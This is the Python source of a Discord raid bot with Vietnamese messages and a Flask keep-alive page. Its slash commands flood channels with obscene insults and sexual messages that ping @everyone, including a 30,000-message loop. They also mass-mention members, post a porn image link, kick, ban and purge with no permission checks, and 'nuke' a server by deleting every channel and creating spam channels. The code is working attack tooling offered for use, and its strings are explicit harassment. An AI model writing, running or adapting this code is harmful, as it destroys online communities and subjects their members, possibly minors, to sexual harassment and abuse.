import discord
from discord.ext import commands
import asyncio
import random
import os
from flask import Flask
import threading

app = Flask(__name__)

@app.route('/')
def home():
    return "Bot Slash / Thuần - Spam Sex 30000 - Hacker Minh Nhựt"

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True

bot = commands.Bot(command_prefix="!", intents=intents)

insults = ["Đụ má mày @{} ngu vl", "Cặc lồn mẹ mày {} con chó", "@everyone lồn mẹ server này"]
sex_chat = ["Muốn bú cặc không @{}?", "Lồn mày ướt chưa? Tao gửi ảnh sex đây", "Spam địt nhau @everyone"]
porn_images = ["https://i.imgur.com/NSp1v7K.jpeg"]

@bot.event
async def on_ready():
    print(f"Bot SLASH COMMAND ONLINE - {bot.user}")

# ==================== SYNC MẠNH ĐỂ XÓA LỆNH CŨ ====================
@bot.tree.command(name="sync", description="Xóa lệnh cũ và sync lệnh mới (gõ cái này trước)")
async def force_sync(interaction):
    try:
        await bot.tree.sync(guild=interaction.guild)
        await interaction.response.send_message("✅ ĐÃ XÓA LỆNH CŦ VÀ SYNC LỆNH MỚI! Giờ gõ /help thử đi thằng ngu!", ephemeral=False)
    except Exception as e:
        await interaction.response.send_message(f"Lỗi sync: {e}", ephemeral=True)

@bot.tree.command(name="help", description="Xem tất cả lệnh slash /")
async def help_cmd(interaction):
    embed = discord.Embed(title="📋 Danh sách lệnh Slash /", color=0xff0000)
    embed.add_field(name="/spam30000", value="Spam 30000 lần cặc lồn", inline=False)
    embed.add_field(name="/sex [số]", value="Spam chat sex", inline=False)
    embed.add_field(name="/porn [số]", value="Gửi ảnh sex", inline=False)
    embed.add_field(name="/kick @user", value="Kick người", inline=False)
    embed.add_field(name="/ban @user", value="Ban người", inline=False)
    embed.add_field(name="/mass [số]", value="Mass mention chửi", inline=False)
    embed.add_field(name="/clear [số]", value="Xóa tin nhắn", inline=False)
    embed.add_field(name="/nuke", value="Nuke server (nguy hiểm)", inline=False)
    await interaction.response.send_message(embed=embed, ephemeral=False)

@bot.tree.command(name="spam30000", description="Spam 30000 lần cặc lồn")
async def spam30000_slash(interaction):
    await interaction.response.send_message("Bắt đầu spam 30000 lần...", ephemeral=True)
    for _ in range(100):
        for _ in range(300):
            try:
                await interaction.channel.send(random.choice(insults).format("@everyone"))
                await asyncio.sleep(0.3)
            except:
                await asyncio.sleep(5)
        await asyncio.sleep(3)
    await interaction.followup.send("Spam xong! Server sập mẹ nó!", ephemeral=True)

@bot.tree.command(name="sex", description="Spam chat sex")
async def sex_slash(interaction, times: int = 30):
    await interaction.response.send_message("Đang spam sex...", ephemeral=True)
    for _ in range(times):
        try:
            await interaction.channel.send(random.choice(sex_chat).format("@everyone"))
            await asyncio.sleep(0.5)
        except:
            await asyncio.sleep(4)
    await interaction.followup.send("Spam sex xong!", ephemeral=True)

@bot.tree.command(name="porn", description="Gửi ảnh sex")
async def porn_slash(interaction, times: int = 8):
    await interaction.response.send_message(f"Gửi {times} ảnh sex...", ephemeral=True)
    for _ in range(times):
        try:
            await interaction.channel.send(random.choice(porn_images))
            await asyncio.sleep(1.2)
        except:
            await asyncio.sleep(3)
    await interaction.followup.send("Gửi ảnh sex xong!", ephemeral=True)

@bot.tree.command(name="kick", description="Kick người")
async def kick_slash(interaction, member: discord.Member):
    await member.kick()
    await interaction.response.send_message(f"Đã kick {member.mention}!", ephemeral=False)

@bot.tree.command(name="ban", description="Ban người")
async def ban_slash(interaction, member: discord.Member):
    await member.ban()
    await interaction.response.send_message(f"Đã ban {member.mention}!", ephemeral=False)

@bot.tree.command(name="mass", description="Mass mention chửi")
async def mass_slash(interaction, times: int = 15):
    await interaction.response.send_message("Mass mention chạy...", ephemeral=True)
    members = [m.mention for m in interaction.guild.members if not m.bot]
    for _ in range(times):
        try:
            tag = " ".join(random.sample(members, min(10, len(members))))
            await interaction.channel.send(f"{tag} Đụ lồn mẹ chúng mày @everyone")
            await asyncio.sleep(0.7)
        except:
            await asyncio.sleep(4)

@bot.tree.command(name="clear", description="Xóa tin nhắn")
async def clear_slash(interaction, amount: int = 50):
    await interaction.response.send_message("Đang xóa...", ephemeral=True)
    await interaction.channel.purge(limit=amount)
    await interaction.followup.send(f"Đã xóa {amount} tin!", ephemeral=True)

@bot.tree.command(name="nuke", description="Nuke server")
async def nuke_slash(interaction):
    await interaction.response.send_message("BẮT ĐẦU NUKE SERVER...", ephemeral=True)
    for ch in list(interaction.guild.channels):
        try:
            await ch.delete()
            await asyncio.sleep(0.6)
        except:
            pass
    for i in range(25):
        try:
            await interaction.guild.create_text_channel(f"spam-lồn-{i}")
            await asyncio.sleep(1)
        except:
            pass
    await interaction.followup.send("NUKE XONG! Server thành đống cặc lồn!", ephemeral=True)

# ============== CHẠY FLASK + BOT ==============
def run_flask():
    app.run(host="0.0.0.0", port=5000)

if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    bot.run(os.getenv("TOKEN"))